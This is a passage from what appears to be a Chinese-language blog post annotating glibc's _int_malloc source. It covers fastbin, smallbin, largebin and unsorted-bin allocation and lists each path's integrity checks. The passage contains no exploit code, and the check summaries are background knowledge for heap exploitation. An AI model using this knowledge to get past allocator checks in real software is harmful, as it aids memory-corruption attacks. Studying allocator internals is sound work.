class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">static void *_int_malloc(mstate av, size_t bytes) &#123;</span><br><span class="line">    INTERNAL_SIZE_T nb;  &#x2F;* normalized request size *&#x2F;</span><br><span class="line">    unsigned int    idx; &#x2F;* associated bin index *&#x2F;</span><br><span class="line">    mbinptr         bin; &#x2F;* associated bin *&#x2F;</span><br><span class="line"></span><br><span class="line">    mchunkptr       victim;       &#x2F;* inspected&#x2F;selected chunk *&#x2F;</span><br><span class="line">    INTERNAL_SIZE_T size;         &#x2F;* its size *&#x2F;</span><br><span class="line">    int             victim_index; &#x2F;* its bin index *&#x2F;</span><br><span class="line"></span><br><span class="line">    mchunkptr     remainder;      &#x2F;* remainder from a split *&#x2F;</span><br><span class="line">    unsigned long remainder_size; &#x2F;* its size *&#x2F;</span><br><span class="line"></span><br><span class="line">    unsigned int block; &#x2F;* bit map traverser *&#x2F;</span><br><span class="line">    unsigned int bit;   &#x2F;* bit map traverser *&#x2F;</span><br><span class="line">    unsigned int map;   &#x2F;* current word of binmap *&#x2F;</span><br><span class="line"></span><br><span class="line">    mchunkptr fwd; &#x2F;* misc temp for linking *&#x2F;</span><br><span class="line">    mchunkptr bck; &#x2F;* misc temp for linking *&#x2F;</span><br><span class="line"></span><br><span class="line">    const char *errstr &#x3D; NULL;</span><br><span class="line"></span><br><span class="line">    &#x2F;*</span><br><span class="line">       Convert request size to internal form by adding SIZE_SZ bytes</span><br><span class="line">       overhead plus possibly more to obtain necessary alignment and&#x2F;or</span><br><span class="line">       to obtain a size of at least MINSIZE, the smallest allocatable</span><br><span class="line">       size. Also, checked_request2size traps (returning 0) request sizes</span><br><span class="line">       that are so large that they wrap around zero when padded and</span><br><span class="line">       aligned.</span><br><span class="line">     *&#x2F;</span><br><span class="line"></span><br><span class="line">    checked_request2size(bytes, nb);</span><br></pre></td></tr></table></figure><h3 id="arena"><a href="#arena" class="headerlink" title="arena"></a>arena</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* There are no usable arenas.  Fall back to sysmalloc to get a chunk from</span></span><br><span class="line"><span class="comment">   mmap.  */</span></span><br><span class="line"><span class="keyword">if</span> (__glibc_unlikely(av == <span class="literal">NULL</span>)) &#123;</span><br><span class="line">    <span class="keyword">void</span> *p = sysmalloc(nb, av);</span><br><span class="line">    <span class="keyword">if</span> (p != <span class="literal">NULL</span>) alloc_perturb(p, bytes);</span><br><span class="line">    <span class="keyword">return</span> p;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="fast-bin"><a href="#fast-bin" class="headerlink" title="fast bin"></a>fast bin</h3><p>如果申请的 chunk 的大小位于 fastbin 范围内，<strong>需要注意的是这里比较的是无符号整数</strong>。<strong>此外，是从 fastbin 的头结点开始取 chunk</strong>。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">   If the size qualifies as a fastbin, first check corresponding bin.</span></span><br><span class="line"><span class="comment">   This code is safe to execute even if av is not yet initialized, so we</span></span><br><span class="line"><span class="comment">   can try it without checking, which saves some time on this fast path.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> ((<span class="keyword">unsigned</span> <span class="keyword">long</span>) (nb) &lt;= (<span class="keyword">unsigned</span> <span class="keyword">long</span>) (get_max_fast())) &#123;<span class="comment">//申请大小小于等于fastbin上限</span></span><br><span class="line">    <span class="comment">// 得到对应的fastbin的下标</span></span><br><span class="line">    idx             = fastbin_index(nb);</span><br><span class="line">    <span class="comment">// 得到对应的fastbin的头指针</span></span><br><span class="line">    mfastbinptr *fb = &amp;fastbin(av, idx);<span class="comment">//单链表</span></span><br><span class="line">    mchunkptr    pp = *fb;</span><br><span class="line">    <span class="comment">// 利用fd遍历对应的bin内是否有空闲的chunk块，</span></span><br><span class="line">    <span class="keyword">do</span> &#123;</span><br><span class="line">        victim = pp;</span><br><span class="line">        <span class="keyword">if</span> (victim == <span class="literal">NULL</span>) <span class="keyword">break</span>;</span><br><span class="line">    &#125; <span class="keyword">while</span> ((pp = catomic_compare_and_exchange_val_acq(fb, victim-&gt;fd,</span><br><span class="line">                                                        victim)) != victim);</span><br><span class="line">    <span class="comment">// 存在可以利用的chunk</span></span><br><span class="line">    <span class="keyword">if</span> (victim != <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="comment">// 检查取到的 chunk 大小是否与相应的 fastbin 索引一致。</span></span><br><span class="line">        <span class="comment">// 根据取得的 victim ，利用 chunksize 计算其大小。</span></span><br><span class="line">        <span class="comment">// 利用fastbin_index 计算 chunk 的索引。</span></span><br><span class="line">        <span class="keyword">if</span> (__builtin_expect(fastbin_index(chunksize(victim)) != idx, <span class="number">0</span>)) &#123;</span><br><span class="line">            errstr = <span class="string">&quot;malloc(): memory corruption (fast)&quot;</span>;</span><br><span class="line">        errout:</span><br><span class="line">            malloc_printerr(check_action, errstr, chunk2mem(victim), av);</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">// 细致的检查。。只有在 DEBUG 的时候有用</span></span><br><span class="line">        check_remalloced_chunk(av, victim, nb);</span><br><span class="line">        <span class="comment">// 将获取的到chunk转换为mem模式</span></span><br><span class="line">        <span class="keyword">void</span> *p = chunk2mem(victim);</span><br><span class="line">        <span class="comment">// 如果设置了perturb_type, 则将获取到的chunk初始化为 perturb_type ^ 0xff</span></span><br><span class="line">        alloc_perturb(p, bytes);</span><br><span class="line">        <span class="keyword">return</span> p;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="小总结"><a href="#小总结" class="headerlink" title="小总结"></a>小总结</h4><ul><li>malloc 参数是无符号长整型</li><li>fastbin 是从头结点（最新进入）开始取 chunk ，符合“先进后出”</li></ul><h5 id="fast-bin-malloc-检查机制"><a href="#fast-bin-malloc-检查机制" class="headerlink" title="fast bin malloc 检查机制"></a>fast bin malloc 检查机制</h5><p><strong>不启动 DEBUG 时，只检查即将分配 chunk 对应的 idx 是否与申请时的 idx 一致</strong>，步骤如下：</p><ol><li><code>chunksize(victim)</code> ：提取 victim size</li><li><code>fastbin_index()</code> ：查找 victim size 对应的 idx</li><li><code>!= idx</code>：检查是否相等，如果不相等则调用 malloc_printerr 打印错误信息</li></ol><h3 id="small-bin"><a href="#small-bin" class="headerlink" title="small bin"></a>small bin</h3><p>如果获取的内存块的范围处于 small bin 的范围，那么执行如下流程</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">   If a small request, check regular bin.  Since these &quot;smallbins&quot;</span></span><br><span class="line"><span class="comment">   hold one size each, no searching within bins is necessary.</span></span><br><span class="line"><span class="comment">   (For a large request, we need to wait until unsorted chunks are</span></span><br><span class="line"><span class="comment">   processed to find best fit. But for small ones, fits are exact</span></span><br><span class="line"><span class="comment">   anyway, so we can check now, which is faster.)</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (in_smallbin_range(nb)) &#123;</span><br><span class="line">    <span class="comment">// 获取 small bin 的索引</span></span><br><span class="line">    idx = smallbin_index(nb);</span><br><span class="line">    <span class="comment">// 获取对应 small bin 中的 chunk 指针</span></span><br><span class="line">    bin = bin_at(av, idx);</span><br><span class="line">    <span class="comment">// 先执行 victim = last(bin)，获取 small bin 的最后一个 chunk</span></span><br><span class="line">    <span class="comment">// 如果 victim = bin ，那说明该 bin 为空。</span></span><br><span class="line">    <span class="comment">// 如果不相等，那么会有两种情况</span></span><br><span class="line">    <span class="keyword">if</span> ((victim = last(bin)) != bin) &#123;</span><br><span class="line">        <span class="comment">// 第一种情况，small bin 还没有初始化。</span></span><br><span class="line">        <span class="keyword">if</span> (victim == <span class="number">0</span>) <span class="comment">/* initialization check */</span></span><br><span class="line">            <span class="comment">// 执行初始化，将 fast bins 中的 chunk 进行合并</span></span><br><span class="line">            malloc_consolidate(av);</span><br><span class="line">        <span class="comment">// 第二种情况，small bin 中存在空闲的 chunk</span></span><br><span class="line">        <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="comment">// 获取 small bin 中倒数第二个 chunk 。</span></span><br><span class="line">            bck = victim-&gt;bk;</span><br><span class="line">            <span class="comment">// 检查 bck-&gt;fd 是不是 victim，防止伪造</span></span><br><span class="line">            <span class="keyword">if</span> (__glibc_unlikely(bck-&gt;fd != victim)) &#123;</span><br><span class="line">                errstr = <span class="string">&quot;malloc(): smallbin double linked list corrupted&quot;</span>;</span><br><span class="line">                <span class="keyword">goto</span> errout;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="comment">// 设置 victim 对应的 inuse 位</span></span><br><span class="line">            set_inuse_bit_at_offset(victim, nb);</span><br><span class="line">            <span class="comment">// 修改 small bin 链表，将 small bin 的最后一个 chunk 取出来</span></span><br><span class="line">            bin-&gt;bk = bck;</span><br><span class="line">            bck-&gt;fd = bin;</span><br><span class="line">            <span class="comment">// 如果不是 main_arena，设置对应的标志</span></span><br><span class="line">            <span class="keyword">if</span> (av != &amp;main_arena) set_non_main_arena(victim);</span><br><span class="line">            <span class="comment">// 细致的检查，非调试状态没有作用</span></span><br><span class="line">            check_malloced_chunk(av, victim, nb);</span><br><span class="line">            <span class="comment">// 将申请到的 chunk 转化为对应的 mem 状态</span></span><br><span class="line">            <span class="keyword">void</span> *p = chunk2mem(victim);</span><br><span class="line">            <span class="comment">// 如果设置了 perturb_type , 则将获取到的chunk初始化为 perturb_type ^ 0xff</span></span><br><span class="line">            alloc_perturb(p, bytes);</span><br><span class="line">            <span class="keyword">return</span> p;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="小总结-1"><a href="#小总结-1" class="headerlink" title="小总结"></a>小总结</h4><ul><li>malloc 参数是无符号长整型</li><li>smallbin 是从最后结点（最先进入）开始取 chunk ，符合“先进先出”</li></ul><h5 id="small-bin-malloc-检查机制"><a href="#small-bin-malloc-检查机制" class="headerlink" title="small bin malloc 检查机制"></a>small bin malloc 检查机制</h5><p>步骤如下：</p><ol><li><code>bck = victim-&gt;bk;</code>  |  <code>(bck-&gt;fd != victim)</code> ：检查即将分配的的 victim 的上一个 chunk 的 fd 指针是否指向 victim 防止伪造</li><li><code>set_inuse_bit_at_offset(victim, nb);</code> ：修改 victim 的 size inuse 位</li><li><code>bin-&gt;bk = bck;</code>  |  <code>bck-&gt;fd = bin;</code> ：修改链表将 victime 取出来（small bin 最后一个）</li></ol><h3 id="large-bin"><a href="#large-bin" class="headerlink" title="large bin"></a>large bin</h3><p>当 fast bin、small bin 中的 chunk 都不能满足用户请求 chunk 大小时，就会考虑是不是 large bin。但是，其实在 large bin 中并没有直接去扫描对应 bin 中的 chunk，而是<strong>先利用 malloc_consolidate（参见 malloc_state 相关函数） 函数处理 fast bin 中的 chunk，将有可能能够合并的 chunk 先进行合并后放到 unsorted bin 中，不能够合并的就直接放到 unsorted bin 中</strong>，然后再在下面的大循环中进行相应的处理。<strong>为什么不直接从相应的 bin 中取出 large chunk 呢？这是 ptmalloc 的机制，它会在分配 large chunk 之前对堆中碎片 chunk 进行合并，以便减少堆中的碎片。</strong></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">       If this is a large request, consolidate fastbins before continuing.</span></span><br><span class="line"><span class="comment">       While it might look excessive to kill all fastbins before</span></span><br><span class="line"><span class="comment">       even seeing if there is space available, this avoids</span></span><br><span class="line"><span class="comment">       fragmentation problems normally associated with fastbins.</span></span><br><span class="line"><span class="comment">       Also, in practice, programs tend to have runs of either small or</span></span><br><span class="line"><span class="comment">       large requests, but less often mixtures, so consolidation is not</span></span><br><span class="line"><span class="comment">       invoked all that often in most programs. And the programs that</span></span><br><span class="line"><span class="comment">       it is called frequently in otherwise tend to fragment.</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="comment">// 获取large bin的下标。</span></span><br><span class="line">    idx = largebin_index(nb);</span><br><span class="line">    <span class="comment">// 如果存在fastbin的话，会处理 fastbin</span></span><br><span class="line">    <span class="keyword">if</span> (have_fastchunks(av)) malloc_consolidate(av);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="大循环-遍历-unsorted-bin"><a href="#大循环-遍历-unsorted-bin" class="headerlink" title="大循环 - 遍历 unsorted bin"></a>大循环 - 遍历 unsorted bin</h3><blockquote><p>2020.07.08 largebin 分配机制不太明白</p></blockquote><p><strong>如果程序执行到了这里，那么说明 与 chunk 大小正好一致的 bin (fast bin， small bin) 中没有 chunk 可以直接满足需求 ，但是 large chunk 则是在这个大循环中处理</strong>。</p><p>在接下来的这个循环中，主要做了以下的操作</p><ul><li><strong>按照 FIFO 的方式逐个将 unsorted bin 中的 chunk 取出来</strong><ul><li>如果是 small request，则考虑是不是恰好满足，是的话，直接返回。</li><li>如果不是的话，放到对应的 bin 中。</li></ul></li><li>尝试从 large bin 中分配用户所需的内存</li></ul><p>该部分是一个大循环，这是为了尝试重新分配 small bin chunk，这是因为我们虽然会首先使用 large bin，top chunk 来尝试满足用户的请求，但是如果没有满足的话，由于我们在上面没有分配成功 small bin，我们并没有对 fast bin 中的 chunk 进行合并，所以这里会进行 fast bin chunk 的合并，进而使用一个大循环来尝试再次分配 small bin chunk。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">       Process recently freed or remaindered chunks, taking one only if</span></span><br><span class="line"><span class="comment">       it is exact fit, or, if this a small request, the chunk is remainder from</span></span><br><span class="line"><span class="comment">       the most recent non-exact fit.  Place other traversed chunks in</span></span><br><span class="line"><span class="comment">       bins.  Note that this step is the only place in any routine where</span></span><br><span class="line"><span class="comment">       chunks are placed in bins.</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">       The outer loop here is needed because we might not realize until</span></span><br><span class="line"><span class="comment">       near the end of malloc that we should have consolidated, so must</span></span><br><span class="line"><span class="comment">       do so and retry. This happens at most once, and only when we would</span></span><br><span class="line"><span class="comment">       otherwise need to expand memory to service a &quot;small&quot; request.</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> (;;) &#123;</span><br><span class="line">    <span class="keyword">int</span> iters = <span class="number">0</span>;</span><br></pre></td></tr></table></figure><h4 id="unsorted-bin-遍历"><a href="#unsorted-bin-遍历" class="headerlink" title="unsorted bin 遍历"></a>unsorted bin 遍历</h4><p>先考虑 unsorted bin，再考虑 last remainder ，但是对于 small bin chunk 的请求会有所例外。</p><p><strong>注意 unsorted bin 的遍历顺序为 bk。</strong></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 如果 unsorted bin 不为空</span></span><br><span class="line"><span class="comment">// First In First Out</span></span><br><span class="line"><span class="keyword">while</span> ((victim = unsorted_chunks(av)-&gt;bk) != unsorted_chunks(av)) &#123;</span><br><span class="line">    <span class="comment">// victim 为 unsorted bin 的最后一个 chunk</span></span><br><span class="line">    <span class="comment">// bck 为 unsorted bin 的倒数第二个 chunk</span></span><br><span class="line">    bck = victim-&gt;bk;</span><br><span class="line">    <span class="comment">// 判断得到的 chunk 是否满足要求，不能过小，也不能过大</span></span><br><span class="line">    <span class="comment">// 一般 system_mem 的大小为132K</span></span><br><span class="line">    <span class="keyword">if</span> (__builtin_expect(chunksize_nomask(victim) &lt;= <span class="number">2</span> * SIZE_SZ, <span class="number">0</span>) ||</span><br><span class="line">        __builtin_expect(chunksize_nomask(victim) &gt; av-&gt;system_mem, <span class="number">0</span>))</span><br><span class="line">        malloc_printerr(check_action, <span class="string">&quot;malloc(): memory corruption&quot;</span>,</span><br><span class="line">                        chunk2mem(victim), av);</span><br><span class="line">    <span class="comment">// 得到victim对应的chunk大小。</span></span><br><span class="line">    size = chunksize(victim);</span><br></pre></td></tr></table></figure><h5 id="SMALL-REQUEST"><a href="#SMALL-REQUEST" class="headerlink" title="SMALL REQUEST"></a>SMALL REQUEST</h5><p>如果用户的请求为 small bin chunk ，那么我们首先考虑 last remainder，如果 last remainder 是 unsorted bin 中的唯一一块的话， 并且 last remainder 的大小分割后还可以作为一个 chunk ，<strong>为什么没有等号</strong>？</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">               If a small request, try to use last remainder if it is the</span></span><br><span class="line"><span class="comment">               only chunk in unsorted bin.  This helps promote locality for</span></span><br><span class="line"><span class="comment">               runs of consecutive small requests. This is the only</span></span><br><span class="line"><span class="comment">               exception to best-fit, and applies only when there is</span></span><br><span class="line"><span class="comment">               no exact fit for a small chunk.</span></span><br><span class="line"><span class="comment">               */</span></span><br><span class="line"><span class="comment">//是否是smallbin范围；bck是否是链首；remainder是（分配完）剩余部分</span></span><br><span class="line"><span class="keyword">if</span> (in_smallbin_range(nb) &amp;&amp; bck == unsorted_chunks(av) &amp;&amp;</span><br><span class="line">    victim == av-&gt;last_remainder &amp;&amp;</span><br><span class="line">    (<span class="keyword">unsigned</span> <span class="keyword">long</span>) (size) &gt; (<span class="keyword">unsigned</span> <span class="keyword">long</span>) (nb + MINSIZE)) &#123;</span><br><span class="line">    <span class="comment">/* split and reattach remainder */</span></span><br><span class="line">    <span class="comment">// 获取新的 remainder 的大小</span></span><br><span class="line">    remainder_size          = size - nb;</span><br><span class="line">    <span class="comment">// 获取新的 remainder 的位置</span></span><br><span class="line">    remainder               = chunk_at_offset(victim, nb);</span><br><span class="line">    <span class="comment">// 更新 unsorted bin 的情况</span></span><br><span class="line">    <span class="comment">// av是被取出chunk的下一个chunk（fd）</span></span><br><span class="line">    unsorted_chunks(av)-&gt;bk = unsorted_chunks(av)-&gt;fd = remainder;</span><br><span class="line">    <span class="comment">// 更新 av 中记录的 last_remainder</span></span><br><span class="line">    av-&gt;last_remainder                                = remainder;</span><br><span class="line">    <span class="comment">// 更新last remainder的指针</span></span><br><span class="line">    remainder-&gt;bk = remainder-&gt;fd = unsorted_chunks(av);</span><br><span class="line">    <span class="keyword">if</span> (!in_smallbin_range(remainder_size)) &#123;</span><br><span class="line">        remainder-&gt;fd_nextsize = <span class="literal">NULL</span>;</span><br><span class="line">        remainder-&gt;bk_nextsize = <span class="literal">NULL</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// 设置victim的头部，inuse</span></span><br><span class="line">    set_head(victim, nb | PREV_INUSE |</span><br><span class="line">             (av != &amp;main_arena ? NON_MAIN_ARENA : <span class="number">0</span>));</span><br><span class="line">    <span class="comment">// 设置 remainder 的头部</span></span><br><span class="line">    set_head(remainder, remainder_size | PREV_INUSE);</span><br><span class="line">    <span class="comment">// 设置记录 remainder 大小的 prev_size 字段，因为此时 remainder 处于空闲状态。</span></span><br><span class="line">    set_foot(remainder, remainder_size);</span><br><span class="line">    <span class="comment">// 细致的检查，非调试状态下没有作用</span></span><br><span class="line">    check_malloced_chunk(av, victim, nb);</span><br><span class="line">    <span class="comment">// 将 victim 从 chunk 模式转化为mem模式</span></span><br><span class="line">    <span class="keyword">void</span> *p = chunk2mem(victim);</span><br><span class="line">    <span class="comment">// 如果设置了perturb_type, 则将获取到的chunk初始化为 perturb_type ^ 0xff</span></span><br><span class="line">    alloc_perturb(p, bytes);</span><br><span class="line">    <span class="keyword">return</span> p;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h5 id="初始取出"><a href="#初始取出" class="headerlink" title="初始取出"></a>初始取出</h5><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* remove from unsorted list */</span></span><br><span class="line"><span class="comment">//修改 unsortedchunk 链表</span></span><br><span class="line">unsorted_chunks(av)-&gt;bk = bck;</span><br><span class="line">bck-&gt;fd                 = unsorted_chunks(av);</span><br></pre></td></tr></table></figure><h5 id="取出-chunk-大小刚好合适-（EXACT-FIT）"><a href="#取出-chunk-大小刚好合适-（EXACT-FIT）" class="headerlink" title="取出 chunk 大小刚好合适 （EXACT FIT）"></a>取出 chunk 大小刚好合适 （EXACT FIT）</h5><p>如果从 unsorted bin 中取出来的 chunk 大小正好合适，就直接使用。这里应该已经把合并后恰好合适的 chunk 给分配出去了。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* Take now instead of binning if exact fit */</span></span><br><span class="line"><span class="keyword">if</span> (size == nb) &#123;<span class="comment">//大小正好合适</span></span><br><span class="line">    set_inuse_bit_at_offset(victim, size);</span><br><span class="line">    <span class="comment">// 如果不是 main_arena，设置对应的标志</span></span><br><span class="line">    <span class="keyword">if</span> (av != &amp;main_arena) set_non_main_arena(victim);</span><br><span class="line">    <span class="comment">// 细致的检查，非调试状态下没有作用</span></span><br><span class="line">    check_malloced_chunk(av, victim, nb);</span><br><span class="line">    <span class="comment">// 将 victim 从 chunk 模式转化为mem模式</span></span><br><span class="line">    <span class="keyword">void</span> *p = chunk2mem(victim);</span><br><span class="line">    <span class="comment">// 如果设置了perturb_type, 则将获取到的chunk初始化为 perturb_type ^ 0xff</span></span><br><span class="line">    alloc_perturb(p, bytes);</span><br><span class="line">    <span class="comment">//直接返回 chunk 指针</span></span><br><span class="line">    <span class="keyword">return</span> p;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h5 id="将取出来-chunk-放入到-smallbin-（PLACE-CHUNK-IN-SMALL-BIN）"><a href="#将取出来-chunk-放入到-smallbin-（PLACE-CHUNK-IN-SMALL-BIN）" class="headerlink" title="将取出来 chunk 放入到 smallbin （PLACE CHUNK IN SMALL BIN）"></a>将取出来 chunk 放入到 smallbin （PLACE CHUNK IN SMALL BIN）</h5><p>把取出来的 chunk 放到对应的 small bin 中。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">         <span class="comment">/* place chunk in bin */</span></span><br><span class="line"><span class="comment">//判断 size 是否在smallbin</span></span><br><span class="line">         <span class="keyword">if</span> (in_smallbin_range(size)) &#123;</span><br><span class="line">             <span class="comment">// 获取 small bin 的索引</span></span><br><span class="line">             victim_index = smallbin_index(size);</span><br><span class="line">             <span class="comment">// 调整 small bin 的链表</span></span><br><span class="line">             bck          = bin_at(av, victim_index);</span><br><span class="line">             fwd          = bck-&gt;fd;</span><br></pre></td></tr></table></figure><h5 id="PLACE-CHUNK-IN-LARGE-BIN"><a href="#PLACE-CHUNK-IN-LARGE-BIN" class="headerlink" title="PLACE CHUNK IN LARGE BIN"></a>PLACE CHUNK IN LARGE BIN</h5><p>把取出来的 chunk 放到对应的 large bin 中。</p><blockquote><p>这里应该是获取正确插入位置的指针 bck、fwd。最后插入形式为：bck&lt;–&gt;victim&lt;–&gt;fwd。</p><p>链表构建在：[最终取出](# 最终取出)</p></blockquote><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br></pre></td><td class="code"><pre><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="comment">// large bin 范围</span></span><br><span class="line">    victim_index = largebin_index(size);</span><br><span class="line">    bck          = bin_at(av, victim_index); <span class="comment">// 当前 large bin 的头部</span></span><br><span class="line">    fwd          = bck-&gt;fd;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* maintain large bins in sorted order 